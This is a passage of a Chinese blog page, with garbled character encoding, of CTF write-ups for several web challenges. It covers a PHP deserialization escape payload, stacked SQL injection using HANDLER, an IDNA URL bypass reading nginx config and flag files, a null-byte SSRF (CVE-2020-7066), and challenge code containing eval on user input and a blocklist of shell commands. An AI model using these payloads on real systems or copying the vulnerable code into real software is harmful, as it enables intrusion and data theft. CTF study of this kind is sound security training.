id=\"0CTF-2016-piapiapia\"><a href=\"#0CTF-2016-piapiapia\" class=\"headerlink\" title=\"[0CTF 2016]piapiapia\"></a>[0CTF 2016]piapiapia</h2><ol>\n<li>/<a href=\"http://www.zipæ‹¿åˆ°æºç /\">www.zipæ‹¿åˆ°æºç </a></li>\n<li>çœ‹æºç åº”è¯¥æ˜¯ååºåˆ—åŒ–çš„é¢˜ç›®ï¼ŒåŒæ—¶çœ‹åˆ°<code>return preg_replace($safe, &#39;hacker&#39;, $string);</code>ï¼Œåº”è¯¥æ˜¯å­—ç¬¦é€ƒé€¸ååºåˆ—åŒ–çš„é¢˜ç›®ã€‚åŒæ—¶flagåº”è¯¥åœ¨config.phpä¸­</li>\n<li>å…ˆæ„é€ POPé“¾</li>\n<li>profile.phpå¯ä»¥è¯»æ–‡ä»¶ï¼Œè¦å®ç°ä»»æ„æ–‡ä»¶è¯»å–å°±è¦è¦†ç›–$profile[â€˜photoâ€™]ï¼Œè€Œ$profile[â€˜photoâ€™]åœ¨update.phpä¸­æ§åˆ¶ã€‚æ¥ä¸‹æ¥å°±æ˜¯è¦å¦‚ä½•æŠŠ$profile[â€˜photoâ€™]å˜æˆconfig.php</li>\n<li>update.phpå¯ä¼ å…¥å››ä¸ªå‚æ•°ï¼Œå…¶ä¸­phoneå’Œemailè¢«æ­£åˆ™åŒ¹é…é™åˆ¶ï¼Œè€Œnicknameæ˜¯ç”¨strlené™åˆ¶åœ¨10ä»¥å†…ï¼ŒæŠŠnicknameæ”¹æˆæ•°ç»„ä¹Ÿå°±ç»•è¿‡äº†é•¿åº¦é™åˆ¶</li>\n<li>æˆ‘ä»¬éœ€è¦æ„é€ <code>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;s:9:&quot;lalalalla&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>ï¼Œåˆ©ç”¨whereä¼šè¢«æ›¿æ¢æˆhackerï¼Œæ„é€ payloadï¼š<code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></li>\n<li>è¦æ³¨æ„è¿™è¾¹æ„é€ æ—¶ï¼Œéœ€è¦æŠŠnicknameæ„é€ æˆæ•°ç»„</li>\n</ol>\n<h2 id=\"GXYCTF2019-ç¦æ­¢å¥—å¨ƒ\"><a href=\"#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ\" class=\"headerlink\" title=\"[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ\"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><ol>\n<li><p>æµ‹è¯•å‘ç°æœ‰/.git/ç”¨githackè·‘ä¸€ä¸‹ï¼Œä½†æ˜¯æˆ‘æ²¡æ‹¿åˆ°æºç ï¼Ÿï¼Ÿ</p>\n</li>\n<li><p>ç½‘ä¸Šæ‰¾åˆ°æºç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&quot;flag.php&quot;</span>;<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ &lt;br&gt;&quot;</span>;<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;exp&#x27;</span>]))&#123;<br>    <span class=\"hljs-keyword\">if</span> (!preg_match(<span class=\"hljs-string\">&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;exp&#x27;</span>])) &#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-string\">&#x27;;&#x27;</span> === preg_replace(<span class=\"hljs-string\">&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;</span>, <span class=\"hljs-literal\">NULL</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;exp&#x27;</span>])) &#123;<br>            <span class=\"hljs-keyword\">if</span> (!preg_match(<span class=\"hljs-string\">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;exp&#x27;</span>])) &#123;<br>                <span class=\"hljs-comment\">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span>&#123;<br>                <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span>&#123;<br>            <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);<br>    &#125;<br>&#125;<br><span class=\"hljs-comment\">// highlight_file(__FILE__);</span><br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure></li>\n<li><p>æ— å‚æ•°RCEï¼ˆ<a href=\"https://xz.aliyun.com/t/6316%EF%BC%89\">https://xz.aliyun.com/t/6316ï¼‰</a></p>\n</li>\n<li><p>ä¸€äº›å¸¸è§å‡½æ•°ï¼š</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\"><span class=\"hljs-function\"><span class=\"hljs-title\">getchwd</span><span class=\"hljs-params\">()</span></span> å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚<br><span class=\"hljs-function\"><span class=\"hljs-title\">scandir</span><span class=\"hljs-params\">()</span></span> å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚<br><span class=\"hljs-function\"><span class=\"hljs-title\">dirname</span><span class=\"hljs-params\">()</span></span> å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚<br><span class=\"hljs-function\"><span class=\"hljs-title\">chdir</span><span class=\"hljs-params\">()</span></span> å‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚<br><br><span class=\"hljs-function\"><span class=\"hljs-title\">readfile</span><span class=\"hljs-params\">()</span></span>  è¾“å‡ºä¸€ä¸ªæ–‡ä»¶<br><br><span class=\"hljs-function\"><span class=\"hljs-title\">current</span><span class=\"hljs-params\">()</span></span>       è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼<br><span class=\"hljs-function\"><span class=\"hljs-title\">pos</span><span class=\"hljs-params\">()</span></span>           current() çš„åˆ«å<br><span class=\"hljs-function\"><span class=\"hljs-title\">next</span><span class=\"hljs-params\">()</span></span> å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br><span class=\"hljs-function\"><span class=\"hljs-title\">end</span><span class=\"hljs-params\">()</span></span>       å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚<br><span class=\"hljs-function\"><span class=\"hljs-title\">array_rand</span><span class=\"hljs-params\">()</span></span>    å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚<br><span class=\"hljs-function\"><span class=\"hljs-title\">array_flip</span><span class=\"hljs-params\">()</span></span>    array_flip() å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚<br><br><span class=\"hljs-function\"><span class=\"hljs-title\">chr</span><span class=\"hljs-params\">()</span></span> å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚<br>hex2bin â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²<br><br><span class=\"hljs-function\"><span class=\"hljs-title\">getenv</span><span class=\"hljs-params\">()</span></span>        è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼(åœ¨<span class=\"hljs-number\">7.1</span>ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°)<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"GYCTF2020-Blacklist\"><a href=\"#GYCTF2020-Blacklist\" class=\"headerlink\" title=\"[GYCTF2020]Blacklist\"></a>[GYCTF2020]Blacklist</h2><ol>\n<li><p>preg_match(â€œ/set|prepare|alter|rename|select|update|delete|drop|insert|where|./iâ€,$inject);</p>\n</li>\n<li><p>ç¬¬ä¸€çœ¼çœ‹é¢˜ç›®åƒå¼ºç½‘æ¯éšä¾¿æ³¨ï¼ŒåŒæ ·æµ‹è¯•å †å æ³¨å…¥</p>\n</li>\n<li><p><code>1&#39;;show tables;</code>=&gt;</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\"><span class=\"hljs-function\"><span class=\"hljs-title\">array</span><span class=\"hljs-params\">(<span class=\"hljs-number\">1</span>)</span></span> &#123;<br>  <span class=\"hljs-selector-attr\">[0]</span>=&gt;<br>  string(<span class=\"hljs-number\">8</span>) <span class=\"hljs-string\">&quot;FlagHere&quot;</span><br>&#125;<br><span class=\"hljs-function\"><span class=\"hljs-title\">array</span><span class=\"hljs-params\">(<span class=\"hljs-number\">1</span>)</span></span> &#123;<br>  <span class=\"hljs-selector-attr\">[0]</span>=&gt;<br>  string(<span class=\"hljs-number\">5</span>) <span class=\"hljs-string\">&quot;words&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure></li>\n<li><p><code>1&#39;;show columns from FlagHere;</code>=&gt;</p>\n<figure class=\"highlight sml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sml\"><span class=\"hljs-built_in\">array</span>(<span class=\"hljs-number\">6</span>) &#123;<br>  [<span class=\"hljs-number\">0</span>]=&gt;<br>  <span class=\"hljs-built_in\">string</span>(<span class=\"hljs-number\">4</span>) <span class=\"hljs-string\">&quot;flag&quot;</span><br>  [<span class=\"hljs-number\">1</span>]=&gt;<br>  <span class=\"hljs-built_in\">string</span>(<span class=\"hljs-number\">12</span>) <span class=\"hljs-string\">&quot;varchar(100)&quot;</span><br>  [<span class=\"hljs-number\">2</span>]=&gt;<br>  <span class=\"hljs-built_in\">string</span>(<span class=\"hljs-number\">2</span>) <span class=\"hljs-string\">&quot;NO&quot;</span><br>  [<span class=\"hljs-number\">3</span>]=&gt;<br>  <span class=\"hljs-built_in\">string</span>(<span class=\"hljs-number\">0</span>) <span class=\"hljs-string\">&quot;&quot;</span><br>  [<span class=\"hljs-number\">4</span>]=&gt;<br>  <span class=\"hljs-type\">NULL</span><br>  [<span class=\"hljs-number\">5</span>]=&gt;<br>  <span class=\"hljs-built_in\">string</span>(<span class=\"hljs-number\">0</span>) <span class=\"hljs-string\">&quot;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure></li>\n<li><p>HANDLER â€¦ OPENè¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­HANDLER â€¦ READè¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨HANDLER â€¦ CLOSEæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­</p>\n<p><code>1&#39;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;</code></p>\n</li>\n</ol>\n<h2 id=\"SUCTF-2019-Pythonginx\"><a href=\"#SUCTF-2019-Pythonginx\" class=\"headerlink\" title=\"[SUCTF 2019]Pythonginx\"></a>[SUCTF 2019]Pythonginx</h2><ol>\n<li><p>æºç ï¼š</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">def getUrl():<br>    url = request.args.<span class=\"hljs-built_in\">get</span>(<span class=\"hljs-string\">&quot;url&quot;</span>)<br>    host = parse.<span class=\"hljs-built_in\">urlparse</span>(url).hostname<br>    if host == <span class=\"hljs-string\">&#x27;suctf.cc&#x27;</span>:<br>        return <span class=\"hljs-string\">&quot;æˆ‘æ‰Œ your problem? 111&quot;</span><br>    parts = <span class=\"hljs-built_in\">list</span>(<span class=\"hljs-built_in\">urlsplit</span>(url))<br>    host = parts[<span class=\"hljs-number\">1</span>]<br>    if host == <span class=\"hljs-string\">&#x27;suctf.cc&#x27;</span>:<br>        return <span class=\"hljs-string\">&quot;æˆ‘æ‰Œ your problem? 222 &quot;</span> + host<br>    newhost = []<br>    for h in host.<span class=\"hljs-built_in\">split</span>(<span class=\"hljs-string\">&#x27;.&#x27;</span>):<br>        newhost.<span class=\"hljs-built_in\">append</span>(h.<span class=\"hljs-built_in\">encode</span>(<span class=\"hljs-string\">&#x27;idna&#x27;</span>).<span class=\"hljs-built_in\">decode</span>(<span class=\"hljs-string\">&#x27;utf-8&#x27;</span>))<br>    parts[<span class=\"hljs-number\">1</span>] = <span class=\"hljs-string\">&#x27;.&#x27;</span>.<span class=\"hljs-built_in\">join</span>(newhost)<br>    #å»æ‰ url ä¸­çš„ç©ºæ ¼<br>    finalUrl = <span class=\"hljs-built_in\">urlunsplit</span>(parts).<span class=\"hljs-built_in\">split</span>(<span class=\"hljs-string\">&#x27; &#x27;</span>)[<span class=\"hljs-number\">0</span>]<br>    host = parse.<span class=\"hljs-built_in\">urlparse</span>(finalUrl).hostname<br>    if host == <span class=\"hljs-string\">&#x27;suctf.cc&#x27;</span>:<br>        return urllib.request.<span class=\"hljs-built_in\">urlopen</span>(finalUrl, timeout=<span class=\"hljs-number\">2</span>).<span class=\"hljs-built_in\">read</span>()<br>    else:<br>        return <span class=\"hljs-string\">&quot;æˆ‘æ‰Œ your problem? 333&quot;</span><br></code></pre></td></tr></table></figure></li>\n<li><p>ç¬¬ä¸€å±‚ï¼Œå½“<code>//</code>æ²¡æœ‰æ­£ç¡®å¼•å…¥æ—¶hostnameå°±æ— æ³•æ­£ç¡®åŒ¹é…åˆ°ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªè¦<code>////</code>å³å¯ç»•è¿‡ç¬¬ä¸€å±‚</p>\n</li>\n<li><p>ç¬¬äºŒã€ä¸‰å±‚å’Œç¬¬ä¸€å±‚ä¸€æ ·ï¼Œä¹Ÿç»•è¿‡äº†</p>\n</li>\n<li><p>Nginxé‡è¦æ–‡ä»¶ä½ç½®</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><br>é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š<span class=\"hljs-regexp\">/etc/</span>nginx<br>ä¸»é…ç½®æ–‡ä»¶ï¼š<span class=\"hljs-regexp\">/etc/</span>nginx<span class=\"hljs-regexp\">/conf/</span>nginx.conf<br>ç®¡ç†è„šæœ¬ï¼š<span class=\"hljs-regexp\">/usr/</span>lib64<span class=\"hljs-regexp\">/systemd/</span>system/nginx.service<br>æ¨¡å—ï¼š<span class=\"hljs-regexp\">/usr/</span>lisb64<span class=\"hljs-regexp\">/nginx/m</span>odules<br>åº”ç”¨ç¨‹åºï¼š<span class=\"hljs-regexp\">/usr/</span>sbin/nginx<br>ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š<span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/nginx/</span>html<br>æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š<span class=\"hljs-regexp\">/var/</span>log/nginx<br>é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š<span class=\"hljs-regexp\">/usr/</span>local<span class=\"hljs-regexp\">/nginx/</span>conf/nginx.conf<br></code></pre></td></tr></table></figure></li>\n<li><p>/usr/local/nginx/conf/nginx.confè¯»åˆ°flagä½ç½®file:////suctf.cc/usr/fffffflagæ‹¿åˆ°flag</p>\n</li>\n<li><p>æ®è¯´é¢„æœŸè§£æ˜¯<code>file://suctf.câ„†sr/fffffflag</code>(<a href=\"https://zhuanlan.zhihu.com/p/104885386?utm_source=wechat_session\">https://zhuanlan.zhihu.com/p/104885386?utm_source=wechat_session</a>)</p>\n</li>\n</ol>\n<h2 id=\"GKCTF2020-CheckIN\"><a href=\"#GKCTF2020-CheckIN\" class=\"headerlink\" title=\"[GKCTF2020]CheckIN\"></a>[GKCTF2020]CheckIN</h2><ol>\n<li><p>æºç ï¼š</p>\n<figure class=\"highlight php-template\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php-template\"><span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Check_In<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span></span><br><span class=\"xml\"></span><span class=\"php\"><span class=\"hljs-meta\">&lt;?php</span> </span><br><span class=\"php\">highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);</span><br><span class=\"php\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">ClassName</span></span></span><br><span class=\"hljs-class\"><span class=\"php\"></span>&#123;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$code</span> = <span class=\"hljs-literal\">null</span>;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$decode</span> = <span class=\"hljs-literal\">null</span>;</span><br><span class=\"php\">        <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>)</span></span><br><span class=\"hljs-function\"><span class=\"php\">        </span>&#123;</span><br><span class=\"php\">                <span class=\"hljs-keyword\">$this</span>-&gt;code = @<span class=\"hljs-keyword\">$this</span>-&gt;x()[<span class=\"hljs-string\">&#x27;Ginkgo&#x27;</span>];</span><br><span class=\"php\">                <span class=\"hljs-keyword\">$this</span>-&gt;decode = @base64_decode( <span class=\"hljs-keyword\">$this</span>-&gt;code );</span><br><span class=\"php\">                @<span class=\"hljs-keyword\">Eval</span>(<span class=\"hljs-keyword\">$this</span>-&gt;decode);</span><br><span class=\"php\">        &#125;</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">x</span>(<span class=\"hljs-params\"></span>)</span></span><br><span class=\"hljs-function\"><span class=\"php\">        </span>&#123;</span><br><span class=\"php\">                <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$_REQUEST</span>;</span><br><span class=\"php\">        &#125;</span><br><span class=\"php\">&#125;</span><br><span class=\"php\"><span class=\"hljs-keyword\">new</span> ClassName();</span><br></code></pre></td></tr></table></figure></li>\n<li><p>ç»™äº†shellï¼Œå…ˆçœ‹ä¸€ä¸‹phpinfoï¼Œå‘ç°æœ‰disable_functionsï¼Œåº”è¯¥æ˜¯é¥¶disable_functionsçš„é¢˜ç›®ï¼Œ<code>/var/tmp/</code>å¯ä»¥å†™æ–‡ä»¶ï¼Œå‚è€ƒLD_PRELOADçš„without send_mailæ–¹æ³•ç»•è¿‡ï¼Œåˆ©ç”¨/readflagå‘½ä»¤æ‹¿åˆ°flag</p>\n</li>\n</ol>\n<h2 id=\"GKCTF2020-cveç‰ˆç­¾åˆ°\"><a href=\"#GKCTF2020-cveç‰ˆç­¾åˆ°\" class=\"headerlink\" title=\"[GKCTF2020]cveç‰ˆç­¾åˆ°\"></a>[GKCTF2020]cveç‰ˆç­¾åˆ°</h2><ol>\n<li>æç¤ºcve-2020-7066ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥%00æˆªæ–­</li>\n<li>headeré‡Œæœ‰hintæç¤ºflagåœ¨localhost</li>\n<li>è®¿é—®?url=127.0.0.1%00.ctfhub.comæ‹¿åˆ°æç¤ºhostè¦ä»¥123ç»“å°¾</li>\n<li>è®¿é—®?url=127.0.0.123%00.ctfhub.comæ‹¿åˆ°flag</li>\n</ol>\n<h2 id=\"å®‰æ´µæ¯-2019-easy-web\"><a href=\"#å®‰æ´µæ¯-2019-easy-web\" class=\"headerlink\" title=\"[å®‰æ´µæ¯ 2019]easy_web\"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><ol>\n<li><p>urlä¸­çš„imgç»è¿‡2æ¬¡base64è§£ç +1æ¬¡ASCII Hexè§£ç å¾—åˆ°555.pngï¼Œäºæ˜¯æŠŠ555.pngæ”¹æˆindex.phpè¯»åˆ°æºç </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>error_reporting(E_ALL || ~ E_NOTICE);<br>header(<span class=\"hljs-string\">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;cmd&#x27;</span>];<br><span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;img&#x27;</span>]) || !<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;cmd&#x27;</span>])) <br>    header(<span class=\"hljs-string\">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class=\"hljs-variable\">$file</span> = hex2bin(base64_decode(base64_decode(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;img&#x27;</span>])));<br><br><span class=\"hljs-variable\">$file</span> = preg_replace(<span class=\"hljs-string\">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class=\"hljs-string\">&quot;&quot;</span>, <span class=\"hljs-variable\">$file</span>);<br><span class=\"hljs-keyword\">if</span> (preg_match(<span class=\"hljs-string\">&quot;/flag/i&quot;</span>, <span class=\"hljs-variable\">$file</span>)) &#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;xixiï½ no flag&quot;</span>);<br>&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>    <span class=\"hljs-variable\">$txt</span> = base64_encode(file_get_contents(<span class=\"hljs-variable\">$file</span>));<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class=\"hljs-variable\">$txt</span> . <span class=\"hljs-string\">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$cmd</span>;<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br><span class=\"hljs-keyword\">if</span> (preg_match(<span class=\"hljs-string\">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;</span>, <span class=\"hljs-variable\">$cmd</span>)) &#123;<br>    <span 